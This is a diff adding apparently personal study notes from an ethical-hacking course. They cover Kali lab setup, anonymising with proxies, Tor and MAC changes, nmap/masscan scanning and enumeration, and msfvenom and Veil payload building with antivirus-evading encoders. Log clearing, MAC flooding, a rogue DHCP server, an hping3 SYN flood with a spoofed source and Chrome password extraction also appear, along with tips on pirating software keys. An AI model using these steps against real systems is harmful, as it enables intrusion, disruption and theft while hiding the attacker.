@@ -1,0 +1,695 @@
+-------------------------------------------------->>> Setup a Linux machine <<<-----------------------------------------------
+
+Install 
+VMware Workstation
+Kali ISO file
+Windows XP for testing
+Metasploitable 2
+
+1. Install VMware Workstation 17 pro and find key on internet and activate it
+2. Add Virtual Machine (Kail) storage 50GB - processor 2-3 - RAM 3-4
+	settings:
+	- open terminal type command "sudo su" >> "cd /etc/apt" >> "gedit sources.list" and uncomment the last line >> save >> close
+	- command "cd /etc/apt" >> apt-get update >> apt-get upgrade
+	- command "cd /home/new/Downloads" >> "git clone https://github.com/leebaird/discover.git" >> "./update.sh" >> "./discover.sh"
+	- command "cd /home/new/Documents" >> "git clone https://github.com/danielmiessler/SecLists.git"
+	- Download Burpsuite "https://drive.google.com/file/d/1R19bRsw72NeGTlwJ9U96rOp8mk8fHQ9m/view" >> "cd/home/new/Downloads" >> "unzip Burpsuite.zip"
+	- Download Java jdk 8 it is compatible version (8u262-b10) "https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=416&field_operating_system_target_id=426&field_architecture_target_id=391&field_java_package_target_id=396"
+	- install Java jdk 8 >> "cd/home/new/downloads" >> "dpkg -i openlogic-openjdk-8u262-b10-linux-x64-deb.deb"
+	- Activate Java jdk 8 >> "update-alternatives --config java" >> select the last one or "Java jdk 8"
+	- Go to Burpsuite dir >> "cd/home/new/downloads/Burpsuite" >> java -noverify -jar ESEdition.jar >> press ok >> copy and paste activation keys >> choose manual intall >> next next next >> ./burp.sh to launch application.
+	- check the hostname if it's kali >> cat cd /etc/hostname
+	- check the hosts if it's kali >> cat cd /etc/hosts
+	- Add proxychains >> cd /etc >> "gedit proxychains4.conf" >> "uncomment dynamichains" and "comment staticchains"
+		- add some proxies/IP in the end of the file such as "http	198.168.1.255	80" 
+		- save changes >> run command to test proxies "proxychains curl https://freeproxylists.net/"
+	- Ready made script/tool "Torghost github" to change IP >> "git clone https://github.com/SusmithKrishnan/torghost.git"
+		- to setup the script >> "cd/home/new/downloads/Torghost" >> ./bulid.sh
+		- to see mannual "python3 torgost.py"
+		- to start "python3 torgost.py -s"
+		- to stop "python3 torgost.py -x"
+	- Changing mac address >> "macchanger -help"
+		* -h,  --help                   Print this help
+		  -V,  --version                Print version and exit
+		  -s,  --show                   Print the MAC address and exit
+		  -e,  --ending                 Don't change the vendor bytes
+		  -a,  --another                Set random vendor MAC of the same kind
+		  -A                            Set random vendor MAC of any kind
+		  -p,  --permanent              Reset to original, permanent hardware MAC
+		  -r,  --random                 Set fully random MAC
+		  -l,  --list[=keyword]         Print known vendors
+		  -b,  --bia                    Pretend to be a burned-in-address
+		  -m,  --mac=XX:XX:XX:XX:XX:XX
+		       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX
+		
+		>>> maccchanger -s eth0(you can find this by writing ifcong)
+
+		* Make file >> "cd/home/new/Documents" >> "echo > mac.sh" >> "chmod +x mac.sh" >> "gedit mac.sh"
+			#!/bin/sh
+			macchanger -e eth0
+			macchanger -e eth0
+			macchanger -e eth0
+			exit
+		* Save and Exit >> "./mac.sh"
+		* "crontab -e" >> press 1 >> add on the top "@reboot /home/new/Documents/mac.sh" >> Ctl+O >> Enter >> Ctl+S >> Ctl+X
+		* "service cron start"
+		* "systemctl enable cron.service"
+		* "systemctl start cron.service"
+		* "update-rc.d cron defaults"
+		* reboot or restart
+
+3. Add new VM and Install Windows XP for testing disk space 50GB - Ram 3-4, processor 1 >> google the activation key.
+4. Add by clicking "open virtual machine" Metasploitable 2 >> by default disk space 8GB - 3-4GB RAM, processor 1
+
+
+
+--------------------------------------------Operating and Testing---------------------------------------------------
+
+
+# Footprinting & Reconnaissace
+> Personal info
+> Company info
+> System info
+> Gathering info about target
+> Entities Belongs to Target
+> Technology is using target
+
+# Types of footprinting & reconnaissance
+> Active (gethering info directly from target)
+> Passive (getthering info inderectly such as involving third party or third party services like social media applications)
+
+# Use of footprinting & reconnaissance
+> Information Gathering
+> Time Saving
+> Easy Processing
+> Accurate Attacking
+
+# How to foot printing
+> Footprinting through search engines
+	- Not evil
+	- Shodan
+	- Censys
+	- Duck Duck Go
+	- Google
+	- Yahoo
+	- Bing
+
+> Footprinting through advance google techniques
+	- Cache:
+	- allintext:
+	- allintitle:
+	- allinurl:
+	- filetype:
+	- inurl:
+	- intitle:
+	- inanchor:
+	- intext:
+	- site:
+	- |:
+	- indexof:
+	- *:
+	- -:
+
+> Footprinting through Social networking sites
+	- Email
+	- Facebook
+	- Instagram
+	- Linkedin
+	
+	note: don't upload much details about you to being ANONYMOUS!
+
+
+
+------------------------------------------>>> Website Footprinting & Reconnaissance <<<---------------------------
+
+
+1 Knowing website Tech (Netcraft, Wapplyzer)
+2 Subdomains of website (subdomainfinder, sublist3r (it's a script download from gitub and run it))
+3 Finding hidden links (Links Extractor, dirb (dirb is a preinstall tool in linux machine just run and use it))
+4 Check security of headers (securityheaders.com)
+5 IP'S and buffers size of website (ping (using CMD terminal))
+6 SSL test (ssllabs.com, ssltest)
+7 wayback Machine (wayback machine)
+8 Checking SPF record and more (SPF test)
+
+--------------------------------------- OR------------------------------------------
+DISCOVER script we installed from github
+RUN ./discover.sh
+choose options and scan website default files location cd /root/data
+
+
+
+------------------------------------------>>> Network Scanning <<<---------------------------
+
+- Process of scanning 
+- Active Devices
+- Open port
+- Checking Misconfiguration
+
+# steps to scan a network
+- Selecting target
+- Scan for IP Range
+- Scan for open ports
+- Checking services
+- Grabbing Versions
+- Grabbing OS
+- Bypassing IDS
+- Selecting correct Scan
+
+Types of Network Scan
+- TCP (three way handshake) >>> -sT | "Nmap -sT IP(192.168.1.1)"
+	| > syn pack > |
+	| < ack syn <  |
+	| > ack ack <  |
+
+- UDP (scan we do in wired network) >>> -sU | "Nmap -sU IP(192.168.1.1)"
+
+- SYN (to safe ourself to get block) >>> -sS | "Nmap -sS IP(192.168.1.1)"
+	| > syn pack > |
+	| < ack syn <  |
+
+- ACK (Generate ack) >>> -sl | "Nmap -sl IP(192.168.1.1)"
+	| > ack ack <  |
+
+- FIN (finshed scan) >>> -sF | "Nmap -sF IP(192.168.1.1)"
+
+- NULL (not comin back with any scan) >>> -sN | "Nmap -sN IP(192.168.1.1)"
+
+- XMAX (Doing scan using a compromised/hacked system not direct from main system to keep ourself safe from getting block) >>> -sX | "Nmap -sX IP(192.168.1.1)"
+
+- IDLE (Doing scan using a compromised/hacked system not direct from main system to keep ourself safe from getting block) >>> -sI | "Nmap -sI IP(192.168.1.1)"
+
+
+
+------------------------------------------->>> Basic to advance network scanning <<<-----------------------------------------------
+
+- Total number of port 65535
+- Run Metasplotable 2
+- login  with user name and password "msfadmin"
+- write command "ifconfig" to get IP to scan the running ports
+- Run linux machine and enter the IP in firefox browser then the metasploitable 2 server will start on webapge
+- open linux terminal and ping the metasploitable 2 IP "ping 192.168.1.1"
+
+Tools for Scanning
+
+- Nmap (basic)
+- Masscan (advance)
+
+
+* -v verbus for detailed infromation
+* -vv double verbus for more detailed infromation
+* -O for complete system operating system
+* -p ports definning
+* -oX o will define that we want output and X define the formate in XML file
+* -T4 level of sacnning
+* -sV for checking the version of running ports
+
+
+- for normal scan
+>> nmap -sT -v 192.168.1.1 (it will discover open ports) we can also check the process by pressing enter
+>> nmap -sU -v 192.168.1.1 (it will discover open ports) we can also check the process by pressing enter
+>> nmap -sS -v 198.168.1.1 (it will dicover all ports even unknown port without stablishing connenction/threeway handshake and firewall cannot block us in this proccess)
+
+- to scan all ports
+>> nmap -sT -T4 -p 1-65535 -v 192.168.1.1
+>> nmap -sT -T4 -sV -p 1-65535 -v 192.168.1.1
+>> nmap -sT -T4 -sV -p 1-65535 -vv 192.168.1.1 -oX textscan.xml
+>> nmap -sT -T4 -sV -O -p 1-65535 -vv 192.168.1.1 -oX textscan.xml
+# once the file is created
+# convert XML file to HTML file
+>> xsltproc testscan.xml -o testscan.html
+>> cd /home/new
+# exit from root permissions
+>> exit
+# to open file file on firefox in html format
+>> firefox testscan.html
+
+- Nmap Scripts for advance use for by default scripts(can also vist the website for futher scripts description)
+>> nmap -A 192.168.1.1 --scripts
+>> nmap -A 192.168.1.1 -sC
+
+
+- Massscan (is used to scan large number of scanning such as servers or more than that)
+>> masscan -p 1-65535 192.168.1.0/24 --rate=10000
+
+
+
+-------------------------------------------- Enumeration --------------------------------------------------------------
+# Protocols 
+	Infomration gathering using following protocols for enumeration or attacking on a system
+
+Types of enummeration:
+
+- SMB
+- SNMP
+- SMTP
+- NTP
+- NetBIOS
+- LDAP
+- DNS Zone Transfer
+
+# the informmatio we can gather are:
+- Username Email ID
+- Brute force Active director
+- User  Groups windows
+- Default passwords
+- DNS zone transfer
+
+-------------------------------------------------Default Ports-------------------------------------------------------
+
+Port Number/	Protocol /	Application
+53		TCP/UDP		DNS Zone transfer
+135		TCP/UDP		RCP Endpoint Mapper
+137		UDP		Net BIOS
+139		TCP		SMB over Net BIOS
+445		TCP/UDP		SMB over TCP
+161		UDP		SNMP
+389		TCP		LDAP
+162		TCP		SNMP Tray
+
+
+#Gather information using Net BIOS
+>> nmap -sT -T4 -sV -p 1-65535 -v 192.168.1.1
+>> nmap -sU -sT -T4 -sV -p 145-155 -v 192.168.1.1
+>> nmap -p 145-155 -v 192.168.1.1 --script=nb*
+
+
+#Gather information using SNMP (simple network management protocol)
+	* it hard to understand for any network administrator so misconfigration always remains
+
+
+------------------------------------- Classification of Vulnerability -------------------------------------
+* Misconfiguration
+* Default installation
+* Buffer Overflows
+* Unpatched servers
+* Design Flaws
+* Operating system Flaws
+* Application Flaws
+* Open services flaws
+* Default passwards
+
+------------------------------------- Vulnerability Assistment Life-cycle-------------------------------------
+
+Creating base line --------> Vlnerability Assistment ------------> Risk Assistament
+^										^
+|			 		Cycle					|
+V										V
+Monitor Verification ------> Verification -----------------------> Remediation
+
+
+
+------------------------ How to find Expolit and vulnerability in available version on open ports ------------------------
+
+# TCP scan and make an HTML file of the results
+>> nmap -sT -T4 -sV -O -p 1-65535 -vv 192.168.238.134 -oX testscan.xml
+>> testscan.xml -o testscan.html
+>> exit
+>> firefox testscan.html
+# http://exploit-db.com/ (here we can find exploits and available vulnerablities in available versions)
+--------------------------- OR -------------------------
+>> searchsploit NameOfPorduct
+
+
+--------------------------------- Vulnerability scanning of a website -------------------------------------
+# search ZAP in linux 
+# update all if required
+# Configure
+# Add "Ajax Spider" and "Active scan"
+
+
+--------------------------------- Steganography (hiding  files behind other file formates) -------------------------------------
+# Openstego (tool for stegnography)
+# install >> chosse file >> set file formate from which behind you want to hide >> set password
+# to open the file install >> chosse file >> enter password >> you will have a orgnal file
+
+
+--------------------------------- How to clear logs file or removing our footprinting -------------------------------------
+
+# For Windows OS Download "clearlogs.exe(https://sourceforge.net/projects/clearlogs/)" 
+# For Kali Linux Manually >> sudo su >> cd /var/logs >> gedit [name of file] (clear all the files which have .log extension)
+
+
+--------------------------------- What is Malware -------------------------------------
+
+* Malicious Software
+* Damages or Disables Computer System
+* Gives full time or limited time access
+* Theft or fraud
+
+--------------------------------- What is Torjan -------------------------------------
+
+* Malicious Software
+* Damages or Disables Computer System
+* Gives full time or limited time access
+* Theft or fraud
+* Communication channels between attacker and victim
+
+--------------------------------- Names of Torjan -------------------------------------
+
+* Torjan Horse
+* Ransomeware
+* Worms
+* backdoor
+* Rootkits
+* Virus
+* Crypter
+
+--------------------------------- Common default ports used by Torjan -------------------------------------
+
+Port No.	Torjan Name
+
+23432		Asylum
+31337		Back orfice
+18006		Back orfice 2000
+12349		Bionet
+6667		Bionet
+80		Codered
+21		DarkFTP
+3150		Deep Throat
+100048		Delf
+23		Elite Wrap
+31338		Net spy
+31339		Net spy
+139		Nuker
+44444		Prosiak
+8012		Ptakks
+7597		Qaz
+4000		RA
+666		Ripper
+1026		RSM
+64666		RSM
+22222		RUX
+11000		Sennaspy
+
+
+--------------------------------- What do you mean by Viruses and Worms -------------------------------------
+
+* Infect other programms
+* Transfroms itself
+* Encrypt itself
+* Alter data
+* Corrupt files and programms
+* Self Replication
+* File Downloads, Infected disk, Email Attachments
+
+
+--------------------------------- Types of Malware Analyzer -------------------------------------
+
+# Static Process
+
+> File fingerprinting
+> Local online Malware scanning
+> Performing strings search
+> Indentifying file dependancies
+> Malware Disassembly
+
+
+# Dynamic Process
+
+System Baseline		/ 	Host Intergrity Monitoring
+> Snapshots for changes	/ Snapshots for changes
+> File System		/ Ports, process, registry, windows, services, startup, programs
+> Registry		/ Event Logs, Installation Files and Folders
+> Open ports		/ Devices Drivers Network Traffic
+> Network Activity	/ DNS, API Calls, Monitoring
+
+
+--------------------------------- How to create payloads -------------------------------------
+
+# Tools Generator
+* Metasploitable
+* msfvenom
+* Veil framework (organization/company stoped updating and upgrading after 2021)
+
+
+--------------------------------- How to create payloads using msfvenom -------------------------------------
+
+# open kali terminal with root permissions
+>> msfvenom -h
+>> msfvenom -l payloads
+# select payload
+>> msfvenom -p [paste payload] LHOST=[IP] LPORT=[8885] > R test.apk (this payload will be easily detectable by antiviruses)
+-------------------------------
+# scan payload virustotal.com
+-------------------------------
+>> msfvenom -l encoders
+# select enocders
+>> msfvenom -p [paste payload] LHOST=[IP] LPORT=[8885] > R test.apk -e [paste encoder] (this payload will be hard to detectable by antiviruses)
+-------------------------------
+# scan payload virustotal.com
+-------------------------------
+
+
+--------------------------------- How to create payloads using Veil framework -------------------------------------
+
+# open kali terminal with root permissions
+
+>> cd /home/new/Downloads
+>> pip3 install pycryptodome
+>> git clone https://github.com/Veil-Framework/Veil.git
+>> cd Veil/
+>> ./config/setup.sh --force --silent
+>> ./Veil.py
+>> use Evasion
+>> list
+>> use [payloads]
+>> set LHOST [IP]
+>> options
+>> generate
+
+# it will a file path copy it and move payload to the desktop
+>> copied path
+>> cp payload.py /home/new/Desktop
+-------------------------------
+# scan payload virustotal.com
+-------------------------------
+
+
+-------------------------------------------- What is sniffing --------------------------------------------------------------
+
+* Monitoring
+* Capturing
+* Data Packages
+* Access Entire Network Traffic
+* Gather sensitive infomration
+* Telnet, Password, Email, traffic, DNS etc.
+
+
+-------------------------------------------- How sniffing works ----------------------------------------------------------
+
+- An attacker connect his laptop to a switch port 
+	Note: To connect with the internet/WIFI/Network for accessing)
+----------------------------------------------------------------------------------------
+- He runs discovery tools to learn about network topology
+	Note: To know who is in network and connected to the network by  running command)
+----------------------------------------------------------------------------------------
+- He identifies victim's machine target his/her attacks 
+	Note: Identify victim machine for info gathering)
+----------------------------------------------------------------------------------------
+- He poisons the victim machine by using ARP spoofing techniques
+	Note: it is the proccess where router takes attandance in every few seconds from all connected devices and update the table continously
+	Note: This is the point where a attacker can steal the IP of victim and give the atandance and collect the victim requested responses from servers, this proccess is called IP spoofing
+----------------------------------------------------------------------------------------
+- The triffic destined for the victim machine is redirect by the attacker
+	Note: Here a attacker can give the attandance instead of victim by stealing their IP  and gethering all victim the data from cilent or server
+----------------------------------------------------------------------------------------
+- The hacker extracts passwords and sensitive data from the redireccted traffic
+	Note: Here a attacker can access all the monitored data and packages which was requested by the end of victim from the the servers/webpages and clints now attacker can access all these info such as passwords, toke number andd other sensitive informations
+----------------------------------------------------------------------------------------
+
+
+-------------------------------------------- active sniffing techniques ----------------------------------------------------------
+
+- Mac flooding
+- DNS Poisioning
+- ARP poisioning
+- DHCP Attacks
+- Swtiching ports stealing
+
+
+-------------------------------------------- Types sniffing ----------------------------------------------------------
+
+- Active sniffing (to do sniffing by connnecting with the network or system)
+- Passive sniffing (to do sniffing by without connnecting with the network or system from far and keeping attacker more secure)
+
+
+-------------------------------------------- Protocol vulnerable for sniffing ----------------------------------------------------------
+
+- Telnet and Relogin
+- HTTP
+- POP
+- IMAP
+- SMTP and NNTP
+- FTP
+
+-------------------------------------------- Sniffing Mac spoofing and flooding ----------------------------------------------------------
+
+#This is to done for stealing a "Mac add" and "IP"  and disconnect the victim from the network
+
+-------------------------------------------- 
+# Changing Mac address Manually
+>> sudo su
+>> netdiscover
+# copy any macaddress
+>> macchanger -m [MAC ADDRESS OF VICTIM MACHINE] eth0
+# checking
+>> netdiscover
+-------------------------------------------- 
+
+-------------------------------------------- 
+# Changing Mac Spoofing Flooding using a tool
+# Mac Spoofing Flooding will full the table and ARP requesting get affected
+
+>> macchanger -p eth0 (for resting mac address)
+>> apt-get update
+>> macof
+>  Yes > Yes
+>> macof
+>> macof -i eth0 -d [router IP] -n 1 	(TEST...)
+>> macof -i eth0 -d [router IP] 	(MAC SPOOFING/ MAC FLOODING)
+# it wil continously change macaddress
+-------------------------------------------- 
+
+-------------------------------------------- DHCP HACKING -------------------------------------------- 
+
+>> yarsinis -G
+# click DHCP > Launch attack > check RAW pack > OK
+# click DHCP > Launch attack > sending discover pack > OK
+# click DHCP > Launch attack > creating DHCP rouge server > OK
+# configure DHCP settings to make our machine router
+	* Server ID		[192.168.238.134]
+	* Start IP		[192.168.238.140]
+	* End IP		[192.168.238.145]
+	* Lease Time (secs)	[3600]
+	* Renew Time (secs)	[3600]
+	* Sebnet Mask		[192.168.248.133] can be any
+	* Router		[192.168.238.134]
+	* DNS Server		[8.8.8.8]
+	* Domain		[new.com]
+
+-------------------------------------------- MITM (men in the middle attack) -------------------------------------------- 
+
+# it can be done by using wireshark but do some research and learn to use it well or find other better tools
+
+-------------------------------------------- Social Engineering -------------------------------------------- 
+
+# The number of tools and tactics which is used to convience a system/person for disclosing their credentials or sensitive information, it is called social engineering.
+* Types of social engineering attacks
+> Human based
+	- Eavesdropping 
+	- Vishing
+	- Shoulder suffring
+	- Piggybacking
+	- Dumpster Diving
+
+> Computer based
+	- Pop-up Windows
+	- Hoax Letters
+	- Chain Letters
+	- Instant chat Messenger
+	- Spam email
+	- Scareware
+
+> Mobile based
+	- Publishing Malicious apps
+	- Repackaging legitmate apps
+	- Using fake security apps
+	- SMiShing (SMS Phishing)
+
+
+-------------------------------------------- Social Engineering toolkit -------------------------------------------- 
+
+>> setoolkit
+
+
+-------------------------------------------- DOS Attack -------------------------------------------- 
+
+# DOS(Denial of services) attack is proccess where a attacker sends data packages from one system more than the proccessing power of a victim system/network to make it down, turned off or corrupt.
+# DDOS(Distributed Denial of services) attack is a proccess where attacker use multiple compromised systems to sending different packages on the victim machine to make it down, it more powerful than DOS attack known as BOTNET/ZOMBIEHOST
+# DRDOS(Disributed reflected denail of services) attack is a proccess where attacker sends packages to Compromized systems/NETBOT/ZOMBIEHOST machines, then that machines forward it to the victim machine, specialities of this attack is that it sends the results back to the attacker (it is more powerful than other attacks)
+
+------------------------------------------- Basic Categories of Dos/DDos Attack Vectors ------------------------------------
+
+- Volumetric attackers(bps)
+	UDP flood attack
+	ICMP flood attack
+	Ping of death and smurf attack
+	Pulse wave and zero-Day attack
+
+- Protocol Attacks(pps)
+	SYN Flood attack
+	Fragementation Attack
+	Spoofed session flood attack
+	ACK Flood attack
+	
+- Application Layer Attacks(rps)
+	HTTP GET/POST
+	Slowloris attack
+	UDP application layer flood attack
+
+
+------------------------------------------- Dos Attack by sending SYN packages in metasploitable machine ------------------------------------
+
+>> hping3 -S 192.168.238.142 -a 192.168.238.141 --flood -p 22 
+
+
+------------------------------------------- Extracting Chrome Passwords ------------------------------------
+
+> Download "https://www.nirsoft.net/utils/chromepass.html"
+> Enter Password > Install > RUN exe file > Passwords will appear
+
+
+------------------------------------------- Session Hijacking ------------------------------------
+
+Meanwhile it's the process where if you steal/guess the session ID between two Computers so you can know the conversation between them.
+
+- Attacker Seizes Control
+- TCP Communication Session
+- Between 2 Computers
+- Authentication only on start of TCP
+- Sniffing All the Traffic
+- Steals Valid Session ID
+- Authentication
+
+------------------------------------------- Why Session Hijacking is successfull ------------------------------------
+
+- Invalid Session ID (AC Lock)
+- Weak Session-ID Generation Algorithm
+- Insecure Session-ID Handling
+- Identify Session Timeout
+- Most PC using TCP/IP - (Vulnerable)
+- Countermeasures do not work without encryption
+
+
+------------------------------------------- Session Hijacking Process ------------------------------------
+
+- Sniff
+- Monitor
+- Session Desynchronization
+- Session ID Prediction
+- Command Injection
+
+
+------------------------------------------- Types Session Hijacking ------------------------------------
+
+- Active
+	- Network Level Hijacking
+		Network level hijacking can be defined as the interception of packets during the transmission between a client and the server in TCP or UDP session.
+		Sources:
+			Wireshark
+			Bupsuite
+
+- Passive
+	- Application Level hijacking
+		Application level hijacking refers to gaining control over the HTTP's user session by otaining the session IDs.
+		Sources:
+			Wireshark
+			Bupsuite
+
+
+
+------------------------------------------- How to connect with a machine via server ------------------------------------
+
+>> python3 -m http.server
+#  browse the target machine IP nad port 8000 (http://192.168.3.102:8000/)
